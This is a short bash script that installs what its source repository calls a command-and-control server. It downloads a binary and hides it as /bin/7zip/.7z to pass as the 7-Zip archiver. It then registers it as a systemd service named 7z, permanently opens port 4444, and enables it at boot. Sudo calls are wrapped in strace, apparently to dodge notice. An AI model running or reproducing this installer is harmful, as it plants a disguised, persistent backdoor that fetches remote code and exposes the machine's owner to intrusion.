#!/bin/bash
sudo strace -o /dev/null mkdir /bin/7zip
curl https://github.com/Palma-Ricardo/c2/raw/main/server -o server
sudo strace -o /dev/null mv server /bin/7zip/.7z
rm server
sudo strace -o /dev/null chmod +x /bin/7zip/.7z
curl https://github.com/Palma-Ricardo/c2/raw/main/7z.service -o 7z.service
sudo strace -o /dev/null mv 7z.service /etc/systemd/system/7z.service
rm 7z.service
sudo strace -o /dev/null firewall-cmd --zone=public --permanent --add-port=4444/tcp
sudo strace -o /dev/null systemctl start 7z
sudo strace -o /dev/null systemctl enable 7z

echo "Installed Successfully"

